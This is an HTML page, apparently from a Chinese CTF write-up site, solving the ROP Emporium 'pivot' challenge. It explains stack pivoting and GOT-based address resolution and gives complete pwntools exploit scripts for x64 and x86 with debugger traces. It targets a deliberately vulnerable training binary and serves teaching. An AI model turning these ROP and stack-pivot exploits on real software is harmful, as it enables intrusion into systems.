@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>pivot &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">pivot</a><ul>
+<li><a class="reference internal" href="#but-why">But why</a></li>
+<li><a class="reference internal" href="#there-s-more">There’s more</a></li>
+<li><a class="reference internal" href="#offset">Offset</a></li>
+<li><a class="reference internal" href="#x64">x64</a></li>
+<li><a class="reference internal" href="#x86">x86</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>pivot</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/6_pivot/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="pivot">
+<h1>pivot<a class="headerlink" href="#pivot" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/pivot.html</p>
+<p>There’s only enough space for a three-link chain on the stack but you’ve been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/pivot.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/pivot32.zip">32bit</a></p>
+<section id="but-why">
+<h2>But why<a class="headerlink" href="#but-why" title="永久链接至标题"></a></h2>
+<p>To “stack pivot” just means to move the stack pointer elsewhere. It’s a useful ROP technique and applies in cases where your initial chain is limited in size (as it is here) or you’ve been able to write a ROP chain elsewhere in memory (a heap spray perhaps) and need to ‘pivot’ onto that new chain because you don’t control the stack.</p>
+</section>
+<section id="there-s-more">
+<h2>There’s more<a class="headerlink" href="#there-s-more" title="永久链接至标题"></a></h2>
+<p>In this challenge you’ll also need to apply what you’ve previously learned about the .plt and .got.plt sections of ELF binaries. If you haven’t already read appendix A in the <a class="reference external" href="https://ropemporium.com/guide.html">beginner’s guide</a>, this would be a good time. This challenge imports a function called foothold_function() from a library that also contains a nice ret2win function.</p>
+</section>
+<section id="offset">
+<h2>Offset<a class="headerlink" href="#offset" title="永久链接至标题"></a></h2>
+<p>The ret2win() function in the libpivot.so shared object isn’t imported, but that doesn’t mean you can’t call it using ROP! You’ll need to find the .got.plt entry of foothold_function() and add the offset of ret2win() to it to resolve its actual address. Notice that foothold_function() isn’t called during normal program flow, you’ll have to call it first to populate the .got.plt entry.</p>
+</section>
+<section id="x64">
+<h2>x64<a class="headerlink" href="#x64" title="永久链接至标题"></a></h2>
+<p>其实这个题目就是 ret2libc 类型的题目</p>
+<p><code class="docutils literal notranslate"><span class="pre">uselessFunction()</span></code> 里面调用了一个  <code class="docutils literal notranslate"><span class="pre">libpivot.so</span></code>  里面的一个函数：<code class="docutils literal notranslate"><span class="pre">foothold_function()</span></code></p>
+<p>直接调用这个函数并没有什么用</p>
+<p>逆向   <code class="docutils literal notranslate"><span class="pre">libpivot.so</span></code>   看， <code class="docutils literal notranslate"><span class="pre">foothold_function()</span></code> 就是一个，打印了 <code class="docutils literal notranslate"><span class="pre">&quot;foothold_function(),</span> <span class="pre">check</span> <span class="pre">out</span> <span class="pre">my</span> <span class="pre">.got.plt</span> <span class="pre">entry</span> <span class="pre">to</span> <span class="pre">gain</span> <span class="pre">a</span> <span class="pre">foothold</span> <span class="pre">into</span> <span class="pre">libpivot.so&quot;</span></code></p>
+<p><img alt="image-20200503210652866" src="../_images/image-20200503210652866.png" /></p>
+<p>真正有用的是： <code class="docutils literal notranslate"><span class="pre">libpivot.so</span></code> 里面的 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code></p>
+<p><img alt="image-20200503210908921" src="../_images/image-20200503210908921.png" /></p>
+<p>但是 <code class="docutils literal notranslate"><span class="pre">pivot</span></code> 程序里面根本没有调用过这个函数，连 <code class="docutils literal notranslate"><span class="pre">plt</span></code> 都没有</p>
+<p>因为系统开了 <code class="docutils literal notranslate"><span class="pre">ASLR</span></code> 和编译  .so 时都是加了 位置无关（<code class="docutils literal notranslate"><span class="pre">-fPIC</span></code>） 这个参数，这个参数依赖 <code class="docutils literal notranslate"><span class="pre">-PIE</span></code>，所以我们根本不可能通过逆向工程得到 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code> 的地址</p>
+<p>这个就涉及到 Linux 下面动态链接的 <code class="docutils literal notranslate"><span class="pre">PLT</span></code> 机制了</p>
+<p>自己去看：https://www.jianshu.com/p/ceb0381acade 或者 https://ropemporium.com/guide.html</p>
+<p>累，不想在这里讲延迟绑定机制</p>
+<p>进入正题</p>
+<p><img alt="image-20200503213211956" src="../_images/image-20200503213211956.png" /></p>
+<p>只能输入 <code class="docutils literal notranslate"><span class="pre">0x40</span> <span class="pre">Bytes</span></code> 的数据，而上面的 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 链长度已将超过了 <code class="docutils literal notranslate"><span class="pre">0x40</span> <span class="pre">Bytes</span></code></p>
+<p>该怎么办，看到：</p>
+<p><img alt="image-20200504002528820" src="../_images/image-20200504002528820.png" /></p>
+<p><img alt="image-20200504002608271" src="../_images/image-20200504002608271.png" /></p>
+<p>程序给出了一块 <code class="docutils literal notranslate"><span class="pre">0x100</span></code> 的空间</p>
+<p>再看 <code class="docutils literal notranslate"> <span class="pre">usefulGadgets()</span></code></p>
+<p><img alt="image-20200504002737609" src="../_images/image-20200504002737609.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
+                    *                 FUNCTION                 *
+                    ********************************************
+                    undefined usefulGadgets()
+         undefined    AL:1      &lt;RETURN&gt;
+                    usefulGadgets                     XREF[1]: Entry Point(*)  
+   00400b00 58         POP     RAX
+   00400b01 c3         RET
+   00400b02 48 94      XCHG    RAX,RSP
+   00400b04 c3         RET
+   00400b05 48 8b 00   MOV     RAX,qword ptr [RAX]
+   00400b08 c3         RET
+   00400b09 48 01 e8   ADD     RAX,RBP
+   00400b0c c3         RET
+   00400b0d 0f 1f 00   NOP     dword ptr [RAX]
+</pre></div>
+</div>
+<p>看到 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rax;</span> <span class="pre">ret</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">xchg</span> <span class="pre">rax,rsp;</span> <span class="pre">ret</span></code></p>
+<p>能操作 <code class="docutils literal notranslate"><span class="pre">rsp</span></code>，可以把栈转移到 <code class="docutils literal notranslate"><span class="pre">malloc</span></code> 分配的那块内存那里，这样就有足够的空间放置 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 链</p>
+<p>其实思路是这样的：</p>
+<p>第一次输入，是往 参数 <code class="docutils literal notranslate"><span class="pre">param_1</span></code> 指向的内存那里去写的，可以有 <code class="docutils literal notranslate"><span class="pre">0x100</span> <span class="pre">Bytes</span></code> 的空间，我们先构造好的 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 链放在这里</p>
+<p>第二次输入，利用栈溢出，把栈转移到 <code class="docutils literal notranslate"><span class="pre">param_1</span></code> 指向的内存那里去，从这里开始执行 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 链</p>
+<p>payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># _*_ coding=utf-8 _*_</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./pivot&quot;</span><span class="p">)</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pivot&quot;</span><span class="p">)</span>
+<span class="n">libpivot</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libpivot.so&quot;</span><span class="p">)</span>
+
+<span class="n">foothold_function_got</span> <span class="o">=</span> <span class="n">pivot</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;foothold_function&quot;</span><span class="p">]</span>
+<span class="n">foothold_function_plt</span> <span class="o">=</span> <span class="n">pivot</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;foothold_function&quot;</span><span class="p">]</span>
+<span class="n">foothold_function_offset</span> <span class="o">=</span> <span class="n">libpivot</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;foothold_function&quot;</span><span class="p">]</span>
+<span class="n">ret2win_offset</span> <span class="o">=</span> <span class="n">libpivot</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;ret2win&quot;</span><span class="p">]</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;pivot: &quot;</span><span class="p">)</span>
+<span class="n">ropchain</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">ropchain</span><span class="p">))</span>
+
+<span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x00400b00</span>
+<span class="n">xchg_rax_rsp_ret</span> <span class="o">=</span> <span class="mh">0x00400b02</span>
+<span class="n">mov_rax_memRax_ret</span> <span class="o">=</span> <span class="mh">0x400b05</span>
+<span class="n">pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x400900</span>
+
+<span class="n">add_rax_rbp_ret</span> <span class="o">=</span> <span class="mh">0x400b09</span>
+<span class="n">call_rax</span> <span class="o">=</span> <span class="mh">0x40098e</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="c1"># 把程序分配的那块内存的地址放到 rax 里面</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xchg_rax_rsp_ret</span><span class="p">)</span> <span class="c1"># 交换 rax 和 rsp 的值，也就是说执行完这一句程序给我们分配的那块内存就被当成栈，栈顶是 foothold_function 的 plt，所以 ret（相当与 pop rip）执行的时候相于调用了 foothold_function</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">foothold_function_plt</span><span class="p">)</span> <span class="c1"># 放 foothold_function 的 plt，这里会 调用 foothold_function，这个调用过程会解析 foothold_function 的线性地址，然后把它写入 got 表</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="c1"># 获得 foothold_function 的 got 地址</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">foothold_function_got</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_memRax_ret</span><span class="p">)</span> <span class="c1"># 取出 got 地址指向的地址，这个地址就是 foothold_function 的真正的线性地址</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp_ret</span><span class="p">)</span> <span class="c1"># 把 ret2win 与 foothold_function 在 libpivot.so 的相对偏移放进 rbp</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win_offset</span> <span class="o">-</span> <span class="n">foothold_function_offset</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_rax_rbp_ret</span><span class="p">)</span> <span class="c1"># 因为 rax 上面存的是 foothold_function 的线性地址，加上 相对偏移 就能得到 ret2win 的线性地址</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_rax</span><span class="p">)</span> <span class="c1"># call ret2win</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">ROP</span></code> 汇编（省去 <code class="docutils literal notranslate"><span class="pre">_dl_runtime_resolve_xsave</span></code>）：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0x400ae1       &lt;pwnme+166&gt;                    ret    
+    ↓
+   0x400b00       &lt;usefulGadgets&gt;                pop    rax
+   0x400b01       &lt;usefulGadgets+1&gt;              ret    
+ 
+   0x400b02       &lt;usefulGadgets+2&gt;              xchg   rax, rsp
+   0x400b04       &lt;usefulGadgets+4&gt;              ret    
+    ↓
+   0x400850       &lt;foothold_function@plt&gt;        jmp    qword ptr [rip + 0x2017f2] &lt;0x602048&gt;
+    ↓
+   0x7f8f512ef987 &lt;foothold_function+23&gt;    ret    
+    ↓
+   0x400b00       &lt;usefulGadgets&gt;           pop    rax
+   0x400b01       &lt;usefulGadgets+1&gt;         ret    
+    ↓
+   0x400b05       &lt;usefulGadgets+5&gt;         mov    rax, qword ptr [rax]
+   0x400b08       &lt;usefulGadgets+8&gt;         ret
+    ↓
+   0x400b09 &lt;usefulGadgets+9&gt;     add    rax, rbp
+   0x400b0c &lt;usefulGadgets+12&gt;    ret    
+    ↓
+   0x40098e &lt;frame_dummy+30&gt;      call   rax &lt;0x7f8f512efabe&gt;
+</pre></div>
+</div>
+<p>动态调试跟一下吧：</p>
+<p>溢出：</p>
+<p><img alt="image-20200504020237952" src="../_images/image-20200504020237952.png" /></p>
+<p>成功设置 <code class="docutils literal notranslate"><span class="pre">rax</span></code> 的值</p>
+<p><img alt="image-20200504020448044" src="../_images/image-20200504020448044.png" /></p>
+<p>把 <code class="docutils literal notranslate"><span class="pre">rsp</span></code> 指向那个地址，达到转移栈的目的</p>
+<p><img alt="image-20200504020831447" src="../_images/image-20200504020831447.png" /></p>
+<p>下一条就是 <code class="docutils literal notranslate"><span class="pre">ret</span></code> ，执行这个指令的时候相当与 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rip</span></code>,现在 <code class="docutils literal notranslate"><span class="pre">rsp</span></code> 指向 <code class="docutils literal notranslate"><span class="pre">foothold_function</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code>，执行 <code class="docutils literal notranslate"><span class="pre">ret</span></code> 相当于调用 <code class="docutils literal notranslate"><span class="pre">foothold_function</span></code> （可以那么说吧，这个也不太正确，因为正常的调用会改变 <code class="docutils literal notranslate"><span class="pre">rsp</span> </code>再改变 <code class="docutils literal notranslate"><span class="pre">rip</span></code>，这个只是改变了 <code class="docutils literal notranslate"><span class="pre">rip</span></code>）</p>
+<p><img alt="image-20200504021207454" src="../_images/image-20200504021207454.png" /></p>
+<p>成功跳到 <code class="docutils literal notranslate"><span class="pre">foothold_function</span></code>，然后就是 <code class="docutils literal notranslate"><span class="pre">_dl_runtime_resolve_xsave</span></code> 去解析 <code class="docutils literal notranslate"><span class="pre">foothold_function</span></code> 的线性地址，把它写入 <code class="docutils literal notranslate"><span class="pre">got</span></code> 表，再执行真正的 <code class="docutils literal notranslate"><span class="pre">foothold_function</span></code> 函数体</p>
+<p><img alt="image-20200504021451556" src="../_images/image-20200504021451556.png" /></p>
+<p>好了现在写入 <code class="docutils literal notranslate"><span class="pre">got</span></code> 表了</p>
+<p>继续执行</p>
+<p>到 <code class="docutils literal notranslate"><span class="pre">payload</span></code> 中的</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="c1"># 获得 foothold_function 的 got 地址</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">foothold_function_got</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_eax_memEax_ret</span><span class="p">)</span> <span class="c1"># 取出 got 地址指向的地址，这个地址就是 foothold_function 的真正的线性地址</span>
+</pre></div>
+</div>
+<p><img alt="image-20200504021812530" src="../_images/image-20200504021812530.png" /></p>
+<p>成功把 <code class="docutils literal notranslate"><span class="pre">foothold_function</span></code> 的线性地址放入 <code class="docutils literal notranslate"><span class="pre">rax</span></code></p>
+<p>接着执行</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp_ret</span><span class="p">)</span> <span class="c1"># 把 ret2win 与 foothold_function 在 libpivot.so 的相对偏移放进 rbp</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win_offset</span> <span class="o">-</span> <span class="n">foothold_function_offset</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>把 相对偏移量放入 <code class="docutils literal notranslate"><span class="pre">rbp</span></code> 里面</p>
+<p><img alt="image-20200504022131989" src="../_images/image-20200504022131989.png" /></p>
+<p>看到了吗，<code class="docutils literal notranslate"><span class="pre">$rax</span> <span class="pre">+</span> <span class="pre">$rbp</span></code> 就是 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code></p>
+<p>执行到</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_rax_rbp_ret</span><span class="p">)</span> <span class="c1"># 因为 rax 上面存的是 foothold_function 的线性地址，加上 相对偏移 就能得到 ret2win 的线性地址</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_rax</span><span class="p">)</span> <span class="c1"># call ret2win</span>
+</pre></div>
+</div>
+<p><img alt="image-20200504022334944" src="../_images/image-20200504022334944.png" /></p>
+<p>相当与 <code class="docutils literal notranslate"><span class="pre">call</span> <span class="pre">ret2win</span></code></p>
+<p><img alt="image-20200504022510781" src="../_images/image-20200504022510781.png" /></p>
+<p>pwn!</p>
+</section>
+<section id="x86">
+<h2>x86<a class="headerlink" href="#x86" title="永久链接至标题"></a></h2>
+<p>一样的思路</p>
+<p><img alt="image-20200504023326736" src="../_images/image-20200504023326736.png" /></p>
+<p><img alt="image-20200504023554842" src="../_images/image-20200504023554842.png" /></p>
+<p>一样的，空间不够需要把 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 链放在 <code class="docutils literal notranslate"><span class="pre">param_1</span></code></p>
+<p>在 <code class="docutils literal notranslate"><span class="pre">usefulGadgets()</span> </code>中</p>
+<p><img alt="image-20200504023754034" src="../_images/image-20200504023754034.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
+                    *                 FUNCTION                 *
+                    ********************************************
+                    undefined usefulGadgets()
+         undefined    AL:1      &lt;RETURN&gt;
+                    usefulGadgets                     XREF[1]: Entry Point(*)  
+   080488c0 58         POP     EAX
+   080488c1 c3         RET
+   080488c2 94         XCHG    EAX,ESP
+   080488c3 c3         RET
+   080488c4 8b 00      MOV     EAX,dword ptr [EAX]
+   080488c6 c3         RET
+   080488c7 01 d8      ADD     EAX,EBX
+   080488c9 c3         RET
+   080488ca 66 90      NOP
+   080488cc 66 90      NOP
+   080488ce 66 90      NOP
+</pre></div>
+</div>
+<p>完全一样的思路，看上面的 <code class="docutils literal notranslate"><span class="pre">x64</span></code> 吧</p>
+<p>payload：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span># _*_ coding=utf-8 _*_
+from pwn import *
+
+p = process(&quot;./pivot32&quot;)
+pivot = ELF(&quot;./pivot32&quot;)
+libpivot = ELF(&quot;./libpivot32.so&quot;)
+
+foothold_function_got = pivot.got[&quot;foothold_function&quot;]
+foothold_function_plt = pivot.plt[&quot;foothold_function&quot;]
+foothold_function_offset = libpivot.symbols[&quot;foothold_function&quot;]
+ret2win_offset = libpivot.symbols[&quot;ret2win&quot;]
+
+p.recvuntil(&quot;pivot: &quot;)
+ropchain = int(p.recv(10), 16)
+print(hex(ropchain))
+
+pop_eax_ret = 0x080488c0
+xchg_eax_esp_ret = 0x080488c2
+mov_eax_memEax_ret = 0x080488c4
+pop_ebx_ret = 0x08048571
+
+add_eax_ebx_ret = 0x080488c7
+call_eax = 0x080486a3
+
+exp = &quot;A&quot; * 0x2c
+exp += p32(pop_eax_ret) # 把程序分配的那块内存的地址放到 rax 里面
+exp += p32(ropchain)
+exp += p32(xchg_eax_esp_ret) # 交换 eax 和 esp 的值，也就是说执行完这一句程序给我们分配的那块内存就被当成栈，栈顶是 foothold_function 的 plt，所以 ret（相当与 pop eip）执行的时候相于调用了 foothold_function
+
+rop = p32(foothold_function_plt) # 放 foothold_function 的 plt，这里会 调用 foothold_function，这个调用过程会解析 foothold_function 的线性地址，然后把它写入 got 表
+rop += p32(pop_eax_ret) # 获得 foothold_function 的 got 地址
+rop += p32(foothold_function_got)
+rop += p32(mov_eax_memEax_ret) # 取出 got 地址指向的地址，这个地址就是 foothold_function 的真正的线性地址
+rop += p32(pop_ebx_ret) # 把 ret2win 与 foothold_function 在 libpivot.so 的相对偏移放进 ebx
+rop += p32(ret2win_offset - foothold_function_offset)
+rop += p32(add_eax_ebx_ret) # 因为 eax 上面存的是 foothold_function 的线性地址，加上 相对偏移 就能得到 ret2win 的线性地址
+rop += p32(call_eax) # call ret2win
+
+gdb.attach(pidof(p)[0])
+p.sendline(rop)
+p.sendline(exp)
+p.interactive()
+</pre></div>
+</div>
+<p>这个 payload 还是直接复制，然后改了 <code class="docutils literal notranslate"><span class="pre">gadget</span></code> 的地址，和这里用来存 相对偏移量的是 <code class="docutils literal notranslate"><span class="pre">ebx</span></code> 而不是 <code class="docutils literal notranslate"><span class="pre">rbp</span></code>，其他的没有区别</p>
+<p><img alt="image-20200504025713593" src="../_images/image-20200504025713593.png" /></p>
+<p>pwn!</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
